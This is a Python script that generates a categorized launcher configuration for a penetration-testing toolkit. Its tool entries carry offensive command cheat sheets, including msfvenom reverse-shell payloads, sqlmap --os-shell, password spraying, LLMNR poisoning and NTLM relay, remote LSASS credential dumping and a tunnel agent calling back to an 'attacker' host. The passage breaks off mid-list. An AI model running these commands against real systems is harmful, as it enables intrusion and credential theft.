#!/usr/bin/env python3
"""
生成合并后的 asuTools 工具配置
- 从 TH_Tools/config/tools.json 读取 199 个工具
- 修复/验证所有路径
- 重新分类（外网打点→内网后渗透→域渗透全流程）
- 输出到 ~/Library/Application Support/asuTools/
"""
import json
import os
import re
import uuid
from pathlib import Path

TH_BASE = Path.home() / "Workspace/security/tools/TH_Tools"
DATA_DIR = Path.home() / "Library/Application Support/asuTools"
DATA_DIR.mkdir(parents=True, exist_ok=True)

JAVA8_HOME = str(TH_BASE / "Java_path/Java_8_Mac/Contents/Home")
JAVA11_HOME = str(TH_BASE / "Java_path/Java_11_Mac/Contents/Home")

# ── 新分类体系 ──────────────────────────────────────────────────────────────
CATEGORIES = [
    {"id": "recon",        "name": "外网打点 / 信息收集",    "order": 1},
    {"id": "vuln-scan",    "name": "漏洞扫描",              "order": 2},
    {"id": "web-exploit",  "name": "Web漏洞利用",           "order": 3},
    {"id": "framework",    "name": "框架漏洞利用",           "order": 4},
    {"id": "deserialize",  "name": "反序列化利用",           "order": 5},
    {"id": "intranet",     "name": "内网渗透",              "order": 6},
    {"id": "domain",       "name": "域渗透 / AD攻击",       "order": 7},
    {"id": "tunnel",       "name": "隧道代理",              "order": 8},
    {"id": "privesc",      "name": "提权",                  "order": 9},
    {"id": "c2",           "name": "C2框架",                "order": 10},
    {"id": "webshell",     "name": "WebShell管理",          "order": 11},
    {"id": "post-exploit", "name": "后渗透 / 横向移动",      "order": 12},
    {"id": "password",     "name": "密码攻击 / 爆破",        "order": 13},
    {"id": "cloud",        "name": "云安全",                "order": 14},
    {"id": "proxy",        "name": "抓包代理",              "order": 15},
    {"id": "android",      "name": "安卓分析",              "order": 16},
    {"id": "reverse",      "name": "逆向工程",              "order": 17},
    {"id": "pwn",          "name": "PWN / CTF",            "order": 18},
    {"id": "traffic",      "name": "流量分析",              "order": 19},
    {"id": "forensics",    "name": "应急响应 / 取证",        "order": 20},
    {"id": "code-audit",   "name": "代码审计",              "order": 21},
    {"id": "crypto",       "name": "密码学 / 编解码",        "order": 22},
    {"id": "other",        "name": "其他工具",              "order": 23},
]

# ── 原分类 → 新分类映射 ──────────────────────────────────────────────────────
CAT_MAP = {
    "信息收集":    "recon",
    "漏洞扫描器":  "vuln-scan",
    "Web漏洞利用": "web-exploit",
    "框架漏洞利用": "framework",
    "反序列化":    "deserialize",
    "内网渗透":    "intranet",
    "域渗透":      "domain",
    "隧道代理":    "tunnel",
    "提权":        "privesc",
    "提权工具":    "privesc",
    "C2框架":      "c2",
    "WebShell管理": "webshell",
    "后渗透其他":  "post-exploit",
    "密码攻击":    "password",
    "爆破工具":    "password",
    "云安全":      "cloud",
    "抓包与代理":  "proxy",
    "安卓分析":    "android",
    "逆向工程":    "reverse",
    "解密模块":    "crypto",
    "漏洞利用":    "framework",   # CVE PoC 大多是框架/系统漏洞
    "应急响应":    "forensics",
    "代码审计":    "code-audit",
    "其他工具":    "other",
}

def slug(name: str) -> str:
    s = re.sub(r"[^a-z0-9]+", "-", name.lower()).strip("-")
    return s[:40]

def fix_path(raw: str) -> tuple[str, bool]:
    """返回 (修复后路径, 是否存在)"""
    if not raw:
        return raw, False
    # 内部工具 tools/xxx → 绝对路径
    if raw.startswith("tools/") or raw.startswith("/tools/"):
        p = TH_BASE / raw.lstrip("/")
        return str(p), p.exists()
    # 绝对路径直接检查
    p = Path(raw)
    return raw, p.exists()

def map_type(th_type: str) -> str:
    return {
        "JAVA8":   "java",
        "JAVA11":  "java",
        "Python":  "python",
        "Shell脚本": "shell",
        "GUI应用":  "gui",
    }.get(th_type, "shell")

def java_env_id(th_type: str) -> str | None:
    if th_type == "JAVA8":
        return "java-java-8-mac-1-8-0-421"
    if th_type == "JAVA11":
        return "java-java-11-mac-11-0-24"
    return None

# ── 读取 TH_Tools 工具列表 ──────────────────────────────────────────────────
with open(TH_BASE / "config/tools.json", encoding="utf-8") as f:
    th_tools = json.load(f)

tools_out = []
missing = []

for t in th_tools:
    raw_path = t.get("path", "")
    fixed_path, exists = fix_path(raw_path)
    cat_new = CAT_MAP.get(t.get("category", ""), "other")
    tool_type = map_type(t.get("type", "Shell脚本"))

    # GUI 应用存在才加，缺失的 .app 标记跳过（避免空壳）
    if not exists:
        missing.append(t["name"])
        # 仍然加入，但标记为不可用（用户可知道需要安装）
        # 对于 .app，跳过已知未安装的
        if fixed_path.endswith(".app"):
            continue
        # 对于路径不存在的二进制工具，跳过
        if not fixed_path.endswith(".jar") and not fixed_path.endswith(".py") and not fixed_path.endswith(".sh"):
            if tool_type in ("shell", "python"):
                continue

    entry = {
        "id":          slug(t["name"]),
        "name":        t["name"],
        "type":        tool_type,
        "path":        fixed_path,
        "category":    cat_new,
        "env_id":      java_env_id(t.get("type", "")),
        "args":        t.get("params", ""),
        "tags":        t.get("tags", []),
        "description": t.get("description", ""),
        "available":   exists,
    }
    tools_out.append(entry)

# ── 追加额外的系统工具（TH_Tools 没有但系统已安装） ──────────────────────────
EXTRA_TOOLS = [
    # 外网打点
    {"name": "nmap",          "type": "shell", "path": "/opt/homebrew/bin/nmap",
     "category": "recon",     "args": "-sV -sC",
     "tags": ["端口扫描","服务识别"],
     "description": "网络扫描利器\n常用命令:\n  nmap -sV -sC <target>         服务版本探测+默认脚本\n  nmap -p- <target>              全端口扫描\n  nmap -sU --top-ports 100 <t>   UDP扫描\n  nmap -A -O <target>            OS探测+traceroute\n  nmap --script vuln <target>    漏洞脚本扫描"},
    {"name": "masscan",       "type": "shell", "path": "/opt/homebrew/bin/masscan",
     "category": "recon",     "args": "--rate=10000",
     "tags": ["端口扫描","高速"],
     "description": "高速全网端口扫描\n常用命令:\n  masscan <IP/CIDR> -p1-65535 --rate=10000\n  masscan -iL targets.txt -p80,443,8080 --rate=5000\n  masscan 10.0.0.0/8 -p22,80,443 --rate=100000"},
    {"name": "naabu",         "type": "shell", "path": "/opt/homebrew/bin/naabu",
     "category": "recon",     "args": "-top-ports 1000",
     "tags": ["端口扫描","projectdiscovery"],
     "description": "快速端口扫描工具\n常用命令:\n  naabu -host <target> -top-ports 1000\n  naabu -list targets.txt -p 80,443,8080,8443\n  naabu -host <target> -p- -rate 10000"},
    {"name": "subfinder",     "type": "shell", "path": "/opt/homebrew/bin/subfinder",
     "category": "recon",     "args": "-d example.com -all",
     "tags": ["子域名","资产发现"],
     "description": "被动子域名枚举\n常用命令:\n  subfinder -d target.com -all -o subs.txt\n  subfinder -d target.com -recursive\n  subfinder -dL domains.txt -o subs.txt"},
    {"name": "amass enum",    "type": "shell", "path": "/opt/homebrew/bin/amass",
     "category": "recon",     "args": "enum -passive -d example.com",
     "tags": ["子域名","资产发现","OSINT"],
     "description": "综合资产发现 (子域名+ASN+IP)\n常用命令:\n  amass enum -passive -d target.com\n  amass enum -active -d target.com -brute\n  amass intel -whois -d target.com\n  amass db -show -d target.com"},
    {"name": "httpx",         "type": "shell", "path": "/opt/homebrew/bin/httpx",
     "category": "recon",     "args": "-l urls.txt -status-code -title -tech-detect",
     "tags": ["HTTP探测","Web存活","指纹"],
     "description": "HTTP探测与指纹识别\n常用命令:\n  cat urls.txt | httpx -status-code -title -tech-detect\n  echo target.com | httpx -probe -silent\n  httpx -l hosts.txt -o alive.txt -sc -ct -title\n  httpx -l hosts.txt -screenshot -srd screens/"},
    {"name": "katana",        "type": "shell", "path": "/opt/homebrew/bin/katana",
     "category": "recon",     "args": "-u https://example.com -d 3",
     "tags": ["爬虫","资产发现"],
     "description": "现代化Web爬虫\n常用命令:\n  katana -u https://target.com -d 3 -o urls.txt\n  katana -u https://target.com -jc -kf all\n  katana -list urls.txt -f qurl -o params.txt"},
    {"name": "wafw00f",       "type": "shell", "path": "/Users/admin/.local/bin/wafw00f",
     "category": "recon",     "args": "https://example.com",
     "tags": ["WAF识别","指纹"],
     "description": "WAF识别工具\n常用命令:\n  wafw00f https://target.com\n  wafw00f -a https://target.com  (枚举所有WAF)\n  wafw00f -i targets.txt"},
    {"name": "arjun",         "type": "shell", "path": "/Users/admin/.local/bin/arjun",
     "category": "recon",     "args": "-u https://example.com/api",
     "tags": ["隐藏参数","信息收集"],
     "description": "HTTP隐藏参数发现\n常用命令:\n  arjun -u https://target.com/endpoint\n  arjun -u https://target.com -m POST\n  arjun -i urls.txt -o params.json"},
    {"name": "gitleaks",      "type": "shell", "path": "/opt/homebrew/bin/gitleaks",
     "category": "recon",     "args": "detect --source . -v",
     "tags": ["Secret扫描","敏感信息"],
     "description": "Git仓库敏感信息扫描\n常用命令:\n  gitleaks detect --source . -v\n  gitleaks detect --source /path/to/repo --report-path report.json\n  gitleaks detect --log-opts 'HEAD~10..HEAD'"},
    # 漏洞扫描
    {"name": "nuclei",        "type": "shell", "path": "/opt/homebrew/bin/nuclei",
     "category": "vuln-scan", "args": "-u https://example.com -t cves/",
     "tags": ["漏洞扫描","PoC","CVE"],
     "description": "模板化漏洞扫描器\n常用命令:\n  nuclei -u https://target.com -t cves/ -severity critical,high\n  nuclei -l urls.txt -t exposures/ -o result.txt\n  nuclei -u target.com -tags rce,sqli -as\n  nuclei -u target.com -t network/ -ept http"},
    {"name": "nikto",         "type": "shell", "path": "/opt/homebrew/bin/nikto",
     "category": "vuln-scan", "args": "-h https://example.com",
     "tags": ["Web扫描","漏洞"],
     "description": "Web服务器漏洞扫描\n常用命令:\n  nikto -h https://target.com\n  nikto -h target.com -p 8080,8443\n  nikto -h target.com -Tuning 4  (仅XSS测试)\n  nikto -h target.com -ssl"},
    {"name": "ffuf",          "type": "shell", "path": "/opt/homebrew/bin/ffuf",
     "category": "vuln-scan", "args": "-u https://example.com/FUZZ -w wordlist.txt",
     "tags": ["目录爆破","Fuzz","参数爆破"],
     "description": "高速Web模糊测试\n常用命令:\n  ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt\n  ffuf -u https://target.com/FUZZ -w list.txt -fc 404\n  ffuf -u https://target.com/?FUZZ=test -w params.txt\n  ffuf -u https://target.com/FUZZ -w list.txt -e .php,.bak,.zip"},
    {"name": "gobuster",      "type": "shell", "path": "/opt/homebrew/bin/gobuster",
     "category": "vuln-scan", "args": "dir -u https://example.com -w wordlist.txt",
     "tags": ["目录爆破","DNS爆破"],
     "description": "目录/DNS爆破工具\n常用命令:\n  gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt\n  gobuster dns -d target.com -w subdomains.txt\n  gobuster vhost -u https://target.com -w vhosts.txt"},
    {"name": "feroxbuster",   "type": "shell", "path": "/opt/homebrew/bin/feroxbuster",
     "category": "vuln-scan", "args": "-u https://example.com -w wordlist.txt",
     "tags": ["目录爆破","递归扫描"],
     "description": "递归目录爆破工具\n常用命令:\n  feroxbuster -u https://target.com -w wordlist.txt\n  feroxbuster -u https://target.com -x php,bak,zip\n  feroxbuster -u https://target.com --depth 3 --filter-status 404"},
    # Web漏洞利用
    {"name": "sqlmap",        "type": "shell", "path": "/opt/homebrew/bin/sqlmap",
     "category": "web-exploit","args": "-u 'http://example.com/page?id=1' --batch",
     "tags": ["SQL注入","数据库"],
     "description": "自动化SQL注入利用\n常用命令:\n  sqlmap -u 'http://target.com/?id=1' --batch --dbs\n  sqlmap -u 'http://target.com/?id=1' -D dbname --tables\n  sqlmap -r request.txt --level=5 --risk=3\n  sqlmap -u 'http://target.com/?id=1' --os-shell\n  sqlmap -u 'http://target.com/?id=1' --tamper=space2comment"},
    {"name": "dalfox",        "type": "shell", "path": "/Users/admin/go/bin/dalfox",
     "category": "web-exploit","args": "url https://example.com/search?q=",
     "tags": ["XSS","高速扫描"],
     "description": "高速XSS扫描利用\n常用命令:\n  dalfox url 'https://target.com/search?q=test'\n  dalfox file urls.txt --worker 50\n  cat params.txt | dalfox pipe\n  dalfox url 'https://target.com/?q=test' --blind your-xss-hunter.com"},
    {"name": "SSTImap",       "type": "shell", "path": "/Users/admin/.local/bin/sstimap",
     "category": "web-exploit","args": "-u https://example.com/?name=",
     "tags": ["SSTI","模板注入"],
     "description": "服务端模板注入(SSTI)检测与利用\n常用命令:\n  sstimap -u 'https://target.com/?name=test'\n  sstimap -u 'https://target.com/page' -d 'field=test'\n  sstimap -u 'https://target.com/?tpl=' --os-cmd 'id'"},
    {"name": "commix",        "type": "shell", "path": "/Users/admin/.local/bin/commix",
     "category": "web-exploit","args": "--url='http://example.com/?cmd=whoami'",
     "tags": ["命令注入","RCE"],
     "description": "命令注入自动化利用\n常用命令:\n  commix --url='http://target.com/?param=test'\n  commix -r request.txt --data='field=test'\n  commix --url='http://target.com/page' --technique=all"},
    {"name": "XSStrike",      "type": "shell", "path": "/Users/admin/.local/bin/xsstrike",
     "category": "web-exploit","args": "-u https://example.com/?q=",
     "tags": ["XSS","绕过WAF"],
     "description": "高级XSS检测与WAF绕过\n常用命令:\n  xsstrike -u 'https://target.com/search?q=test'\n  xsstrike -u 'https://target.com/' --data 'q=test'\n  xsstrike -u 'https://target.com/search?q=test' --fuzzer"},
    {"name": "byp4xx",        "type": "shell", "path": "/Users/admin/go/bin/byp4xx",
     "category": "web-exploit","args": "https://example.com/admin",
     "tags": ["403绕过","权限绕过"],
     "description": "403/401/40x 状态码绕过\n常用命令:\n  byp4xx https://target.com/forbidden-path\n  byp4xx -X POST https://target.com/admin\n  byp4xx -d data https://target.com/page"},
    # 内网渗透
    {"name": "fscan",         "type": "shell", "path": "/Users/admin/go/bin/fscan",
     "category": "intranet",  "args": "-h 192.168.1.0/24",
     "tags": ["内网扫描","存活探测","漏洞扫描"],
     "description": "内网综合扫描工具\n常用命令:\n  fscan -h 192.168.1.0/24\n  fscan -h 10.10.10.0/24 -p 80,443,22,3389,1433,3306\n  fscan -h 192.168.1.1/24 -o result.txt\n  fscan -h 192.168.0.1/24 -no"},
    {"name": "netexec (nxc)", "type": "shell", "path": "/Users/admin/.local/bin/netexec",
     "category": "intranet",  "args": "smb 192.168.1.0/24",
     "tags": ["SMB","横向移动","凭证验证"],
     "description": "网络认证利用框架 (CrackMapExec继任者)\n常用命令:\n  nxc smb 192.168.1.0/24              SMB存活探测\n  nxc smb <target> -u admin -p pass  凭证验证\n  nxc smb <target> -u user -p pass --shares  枚举共享\n  nxc winrm <target> -u user -p pass -x 'whoami'\n  nxc ldap <target> -u user -p pass --bloodhound"},
    {"name": "proxychains4",  "type": "shell", "path": "/opt/homebrew/bin/proxychains4",
     "category": "intranet",  "args": "nmap -sT -Pn 10.10.10.1",
     "tags": ["代理链","穿透"],
     "description": "代理链 - 通过socks4/5穿透运行任意命令\n常用命令:\n  proxychains4 nmap -sT -Pn 10.10.10.0/24\n  proxychains4 sqlmap -u http://intranet.local/?id=1\n  proxychains4 curl http://internal-host/\n  # 配置文件: /opt/homebrew/etc/proxychains.conf"},
    # 域渗透
    {"name": "BloodHound.py", "type": "shell", "path": "/Users/admin/.local/bin/bloodhound-python",
     "category": "domain",    "args": "-d DOMAIN -u user -p pass -c all --dns-tcp",
     "tags": ["域渗透","AD","图形化"],
     "description": "AD域信息收集 (BloodHound数据源)\n常用命令:\n  bloodhound-python -d corp.local -u user -p pass -c all -ns <dc-ip>\n  bloodhound-python -d corp.local -u user -p pass -c DCOnly\n  bloodhound-python -d corp.local --auth-method kerberos -k"},
    {"name": "netexec ldap",  "type": "shell", "path": "/Users/admin/.local/bin/netexec",
     "category": "domain",    "args": "ldap <dc_ip> -u user -p pass --users",
     "tags": ["LDAP","域枚举","AD"],
     "description": "LDAP域用户/组枚举\n常用命令:\n  nxc ldap <dc> -u user -p pass --users\n  nxc ldap <dc> -u user -p pass --groups\n  nxc ldap <dc> -u user -p pass --asreproast asrep.txt\n  nxc ldap <dc> -u user -p pass --kerberoasting krb.txt\n  nxc ldap <dc> -u user -p pass --bloodhound -c all"},
    {"name": "kerbrute",      "type": "shell", "path": "/Users/admin/go/bin/kerbrute",
     "category": "domain",    "args": "userenum -d DOMAIN --dc <dc_ip> users.txt",
     "tags": ["Kerberos","爆破","域用户枚举"],
     "description": "Kerberos暴力破解与用户枚举\n常用命令:\n  kerbrute userenum -d corp.local --dc <dc-ip> users.txt\n  kerbrute passwordspray -d corp.local --dc <dc-ip> users.txt 'Pass123!'\n  kerbrute bruteuser -d corp.local --dc <dc-ip> admin users.txt"},
    {"name": "certipy",       "type": "shell", "path": "/opt/homebrew/bin/certipy",
     "category": "domain",    "args": "find -u user@domain -p pass -dc-ip <dc_ip>",
     "tags": ["ADCS","证书攻击","ESC"],
     "description": "Active Directory证书服务(ADCS)攻击\n常用命令:\n  certipy find -u user@corp.local -p pass -dc-ip <dc>  枚举证书模板\n  certipy req -u user@corp.local -p pass -ca CA -template Template  申请证书\n  certipy auth -pfx user.pfx  用证书认证获取NTLM hash\n  certipy shadow auto -u user@corp.local -p pass -account target"},
    {"name": "evil-winrm",    "type": "shell", "path": "/Users/admin/.local/bin/evil-winrm",
     "category": "domain",    "args": "-i <ip> -u admin -p password",
     "tags": ["WinRM","远程Shell","域"],
     "description": "Windows远程管理Shell\n常用命令:\n  evil-winrm -i <target> -u admin -p 'pass'\n  evil-winrm -i <target> -u admin -H <ntlm-hash>\n  evil-winrm -i <target> -u admin -p pass -s scripts/\n  # 内置: upload/download, bypass AMSI, bypass ETW"},
    {"name": "Responder",     "type": "shell", "path": "/Users/admin/.local/bin/responder",
     "category": "domain",    "args": "-I eth0 -A",
     "tags": ["LLMNR毒化","NTLMv2","凭证捕获"],
     "description": "LLMNR/NBT-NS/mDNS毒化 + NTLMv2捕获\n常用命令:\n  responder -I eth0 -A           分析模式(不毒化)\n  responder -I eth0              主动毒化模式\n  responder -I eth0 -w -d        +WPAD+DHCP\n  # Hashes in: /opt/homebrew/share/responder/logs/"},
    {"name": "mitm6",         "type": "shell", "path": "/Users/admin/.local/bin/mitm6",
     "category": "domain",    "args": "-d corp.local",
     "tags": ["IPv6","DHCPv6","域渗透"],
     "description": "IPv6 DNS欺骗 + NTLM中继\n常用命令:\n  mitm6 -d corp.local -i eth0\n  # 配合ntlmrelayx使用:\n  impacket-ntlmrelayx -6 -wh attacker-wh -t smb://dc/\n  impacket-ntlmrelayx -6 -wh attacker-wh -t ldaps://dc --delegate-access"},
    {"name": "bloodyAD",      "type": "shell", "path": "/Users/admin/.local/bin/bloodyad",
     "category": "domain",    "args": "--host <dc_ip> -d DOMAIN -u user -p pass get object 'CN=Users'",
     "tags": ["DACL","ACL滥用","域渗透"],
     "description": "AD DACL/ACL权限滥用工具\n常用命令:\n  bloodyAD --host <dc> -d corp.local -u user -p pass get object 'CN=Domain Admins'\n  bloodyAD --host <dc> -d corp.local -u owner -p pass add genericAll targetUser\n  bloodyAD --host <dc> -d corp.local -u user -p pass set password targetUser 'NewPass123!'"},
    {"name": "pypykatz",      "type": "shell", "path": "/Users/admin/.local/bin/pypykatz",
     "category": "domain",    "args": "lsa smb <ip> -u admin -p pass",
     "tags": ["mimikatz","凭证","LSASS"],
     "description": "纯Python Mimikatz实现\n常用命令:\n  pypykatz lsa minidump lsass.dmp    分析内存dump\n  pypykatz registry --sam SAM --system SYSTEM  离线注册表\n  pypykatz lsa smb <target> -u admin -p pass  远程提取"},
    # 隧道代理
    {"name": "frpc",          "type": "shell", "path": "/opt/homebrew/bin/frpc",
     "category": "tunnel",    "args": "-c frpc.toml",
     "tags": ["内网穿透","反向代理","frp"],
     "description": "FRP内网穿透客户端\n常用命令:\n  frpc -c frpc.toml              启动客户端\n  frpc tcp --server_addr <ip>:7000 --local_port 3389 --remote_port 13389\n  # frpc.toml 示例:\n  # serverAddr = \"x.x.x.x\"; serverPort = 7000\n  # [[proxies]]; name = \"ssh\"; type = \"tcp\"; localPort = 22; remotePort = 6000"},
    {"name": "chisel",        "type": "shell", "path": "/Users/admin/go/bin/chisel",
     "category": "tunnel",    "args": "client <server>:8080 R:socks",
     "tags": ["HTTP隧道","SOCKS5","反弹"],
     "description": "HTTP隧道工具\n常用命令:\n  # 服务端: chisel server -p 8080 --reverse\n  # 客户端-反向SOCKS: chisel client <server>:8080 R:socks\n  # 端口转发: chisel client <server>:8080 R:3389:127.0.0.1:3389\n  # 正向SOCKS: chisel server -p 8080 --socks5 → chisel client <server>:8080 socks"},
    {"name": "gost",          "type": "shell", "path": "/Users/admin/go/bin/gost",
     "category": "tunnel",    "args": "-L :1080",
     "tags": ["多协议隧道","代理链"],
     "description": "多协议隧道代理\n常用命令:\n  gost -L :1080                         本地SOCKS5\n  gost -L :8080 -F socks5://user:pass@server:1080   SOCKS5代理链\n  gost -L tcp://:2222/192.168.1.1:22   TCP端口转发\n  gost -L socks5://:1080 -F 'http://proxy:8080'"},
    {"name": "ligolo-proxy",  "type": "shell", "path": "/Users/admin/.local/bin/ligolo-proxy",
     "category": "tunnel",    "args": "-selfcert -laddr 0.0.0.0:11601",
     "tags": ["TLS隧道","内网穿透","tun接口"],
     "description": "基于TLS的高性能内网隧道\n常用命令:\n  # 攻击机: ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n  # 靶机: ./agent -connect attacker:11601 -ignore-cert\n  # 然后在proxy UI: session → ifconfig → start\n  # 路由: sudo ip route add 192.168.0.0/24 dev ligolo"},
    # 提权
    {"name": "searchsploit",  "type": "shell", "path": "/opt/homebrew/bin/searchsploit",
     "category": "privesc",   "args": "linux kernel 5.4",
     "tags": ["漏洞库","EDB","提权"],
     "description": "ExploitDB离线漏洞搜索\n常用命令:\n  searchsploit linux kernel 5.4\n  searchsploit -x 45010          查看exp代码\n  searchsploit -m 45010          复制exp到当前目录\n  searchsploit --nmap scan.xml   根据nmap结果搜索"},
    # C2框架
    {"name": "msfconsole",    "type": "shell", "path": "/opt/homebrew/bin/msfconsole",
     "category": "c2",        "args": "-q",
     "tags": ["Metasploit","C2","漏洞利用"],
     "description": "Metasploit框架\n常用命令:\n  msfconsole -q\n  # 快速利用:\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/reverse_tcp\n  set LHOST 0.0.0.0; set LPORT 4444; run\n  # 生成payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe > shell.exe"},
    {"name": "sliver",        "type": "shell", "path": "/opt/homebrew/bin/sliver",
     "category": "c2",        "args": "",
     "tags": ["C2","隐蔽","Go"],
     "description": "现代化C2框架(Sliver)\n常用命令:\n  sliver                         进入交互式控制台\n  # 在console内:\n  generate --mtls <attacker-ip>:443 --os windows\n  mtls --lport 443               启动MTLS监听\n  sessions                       查看会话\n  use <session-id>; shell        获取Shell"},
    {"name": "bettercap",     "type": "shell", "path": "/opt/homebrew/bin/bettercap",
     "category": "c2",        "args": "",
     "tags": ["MITM","ARP欺骗","网络攻击"],
     "description": "网络中间人攻击框架\n常用命令:\n  bettercap -iface eth0\n  # 模块:\n  net.probe on; net.show        发现局域网主机\n  arp.spoof on                  ARP欺骗\n  net.sniff on                  流量嗅探\n  https.proxy on                HTTPS代理+SSL剥离"},
    # 密码攻击
    {"name": "hashcat",       "type": "shell", "path": "/opt/homebrew/bin/hashcat",
     "category": "password",  "args": "-m 1000 hashes.txt rockyou.txt",
     "tags": ["GPU破解","哈希","密码"],
     "description": "GPU加速哈希破解\n常用命令:\n  hashcat -m 1000 ntlm.txt rockyou.txt       NTLM破解\n  hashcat -m 18200 asrep.txt rockyou.txt     AS-REP Roasting\n  hashcat -m 13100 krb5tgs.txt rockyou.txt   Kerberoasting\n  hashcat -m 22000 wpa.hccapx rockyou.txt    WPA2破解\n  hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule"},
    {"name": "john",          "type": "shell", "path": "/opt/homebrew/bin/john",
     "category": "password",  "args": "--wordlist=rockyou.txt hash.txt",
     "tags": ["破解","哈希","密码"],
     "description": "John the Ripper密码破解\n常用命令:\n  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n  john --format=NT hash.txt --wordlist=list.txt\n  ssh2john id_rsa > id_rsa.hash && john id_rsa.hash\n  zip2john secret.zip > zip.hash && john zip.hash"},
    {"name": "hydra",         "type": "shell", "path": "/opt/homebrew/bin/hydra",
     "category": "password",  "args": "-l admin -P rockyou.txt ssh://target",
     "tags": ["在线爆破","协议爆破"],
     "description": "在线密码爆破工具\n常用命令:\n  hydra -l admin -P rockyou.txt ssh://target\n  hydra -L users.txt -P pass.txt ftp://target\n  hydra -l admin -P pass.txt target http-post-form '/login:u=^USER^&p=^PASS^:F=error'\n  hydra -l admin -P pass.txt target smb"},
    {"name": "hashid",        "type": "shell", "path": "/opt/homebrew/bin/hashid",
     "category": "password",  "args": "",
     "tags": ["哈希识别","CTF"],
     "description": "哈希类型识别\n常用命令:\n  hashid 'aad3b435b51404eeaad3b435b51404ee'   识别NTLM\n  hashid -m hash.txt                          批量识别并给出hashcat模式\n  hashid '$2y$10$...'                         bcrypt识别"},
    # 云安全
    {"name": "pacu",          "type": "shell", "path": "/Users/admin/.local/bin/pacu",
     "category": "cloud",     "args": "",
     "tags": ["AWS渗透","云安全"],
     "description": "AWS渗透测试框架\n常用命令:\n  pacu                           进入交互控制台\n  # 常用模块:\n  run iam__enum_permissions      枚举IAM权限\n  run s3__enum                   枚举S3桶\n  run ec2__enum                  枚举EC2实例\n  run iam__privesc_scan          权限提升扫描"},
    {"name": "ScoutSuite",    "type": "shell", "path": "/Users/admin/.local/bin/scout",
     "category": "cloud",     "args": "aws",
     "tags": ["多云审计","云安全","合规"],
     "description": "多云安全审计工具\n常用命令:\n  scout aws                      审计AWS\n  scout azure --cli              审计Azure\n  scout gcp --project <proj>     审计GCP\n  # 结果在 scoutsuite-report/ 目录"},
    {"name": "Prowler",       "type": "shell", "path": "/opt/homebrew/bin/prowler",
     "category": "cloud",     "args": "aws --compliance cis_1.4_aws",
     "tags": ["AWS合规","云安全","CIS"],
     "description": "AWS安全合规检查\n常用命令:\n  prowler aws                    完整AWS安全审计\n  prowler aws --compliance cis_1.4_aws\n  prowler aws -s iam,s3,ec2      指定服务审计\n  prowler aws -f us-east-1       指定区域"},
    {"name": "Trivy",         "type": "shell", "path": "/opt/homebrew/bin/trivy",
     "category": "cloud",     "args": "image nginx:latest",
     "tags": ["容器扫描","IaC","CVE"],
     "description": "容器/IaC/代码漏洞扫描\n常用命令:\n  trivy image nginx:latest                   扫描Docker镜像\n  trivy fs /path/to/code                     扫描代码目录\n  trivy k8s --report=all cluster             扫描K8s集群\n  trivy config terraform/                    扫描Terraform IaC"},
    # 抓包代理
    {"name": "Wireshark",     "type": "gui",   "path": "/Applications/Wireshark.app",
     "category": "proxy",     "args": "",
     "tags": ["流量分析","抓包","协议"],
     "description": "网络协议分析器\n功能: 图形化抓包、协议解析、过滤器\n常用过滤器:\n  http.request.method == 'POST'\n  tcp.port == 443\n  ip.addr == 192.168.1.1\n  dns"},
    {"name": "Yakit",         "type": "gui",   "path": "/Applications/Yakit.app",
     "category": "proxy",     "args": "",
     "tags": ["Yakit","国产","渗透平台"],
     "description": "Yakit综合安全测试平台\n功能: MITM抓包、漏洞扫描、爆破、编解码、插件扩展"},
    {"name": "mitmproxy",     "type": "shell", "path": "/opt/homebrew/bin/mitmproxy",
     "category": "proxy",     "args": "",
     "tags": ["抓包","HTTP/S","Python脚本"],
     "description": "交互式HTTP/S代理\n常用命令:\n  mitmproxy                       交互式TUI\n  mitmdump -w output.flow         录制流量\n  mitmweb                         Web界面\n  mitmproxy -s script.py          加载插件脚本"},
    {"name": "tshark",        "type": "shell", "path": "/opt/homebrew/bin/tshark",
     "category": "traffic",   "args": "-i eth0",
     "tags": ["命令行抓包","流量分析","Wireshark"],
     "description": "Wireshark命令行版本\n常用命令:\n  tshark -i eth0 -w capture.pcap\n  tshark -r capture.pcap -Y 'http.request'\n  tshark -r capture.pcap -T fields -e http.host -e http.request.uri\n  tshark -r capture.pcap -Y 'tcp.port==4444' -x"},
    # 安卓分析
    {"name": "jadx-gui",      "type": "shell", "path": "/opt/homebrew/bin/jadx-gui",
     "category": "android",   "args": "",
     "tags": ["APK反编译","Java","安卓"],
     "description": "Android APK/DEX反编译GUI\n常用命令:\n  jadx-gui app.apk               打开GUI\n  jadx -d output/ app.apk        命令行反编译\n  jadx-gui                       拖入APK分析"},
    {"name": "jadx (CLI)",    "type": "shell", "path": "/opt/homebrew/bin/jadx",
     "category": "android",   "args": "-d output/ app.apk",
     "tags": ["APK反编译","命令行"],
     "description": "JADX命令行反编译\n常用命令:\n  jadx -d output/ app.apk        反编译APK\n  jadx -r -d output/ app.apk     反编译+资源\n  jadx -e -d output/ app.apk     导出Gradle项目\n  jadx --show-bad-code app.apk   显示错误代码"},
    {"name": "apktool",       "type": "shell", "path": "/opt/homebrew/bin/apktool",
     "category": "android",   "args": "d app.apk",
     "tags": ["APK","逆向","smali"],
     "description": "APK逆向工程工具\n常用命令:\n  apktool d app.apk              反编译(smali+资源)\n  apktool b app/ -o rebuilt.apk  重新打包\n  apktool d app.apk --no-debug-info"},
    {"name": "frida",         "type": "shell", "path": "/opt/homebrew/bin/frida",
     "category": "android",   "args": "-U -f com.app.package -l script.js",
     "tags": ["动态插桩","Hook","SSL Pinning"],
     "description": "动态插桩框架\n常用命令:\n  frida -U -f com.app.package -l hook.js      USB附加(spawn)\n  frida -U -n AppName -l script.js            附加到运行中的App\n  frida-ps -U                                 列出USB设备进程\n  frida-trace -U -f com.app -m 'Java.perform*'\n  # SSL Pinning bypass: 使用 frida-codeshare 上的脚本"},
    {"name": "objection",     "type": "shell", "path": "/Users/admin/.local/bin/objection",
     "category": "android",   "args": "-g com.app.package explore",
     "tags": ["运行时探测","SSL Pinning","安卓"],
     "description": "基于Frida的安卓运行时探测\n常用命令:\n  objection -g com.app.package explore\n  # 常用命令(在objection shell内):\n  android sslpinning disable              绕过SSL Pinning\n  android root disable                    绕过Root检测\n  android hooking list activities\n  memory dump all mem.dmp"},
    # 逆向工程
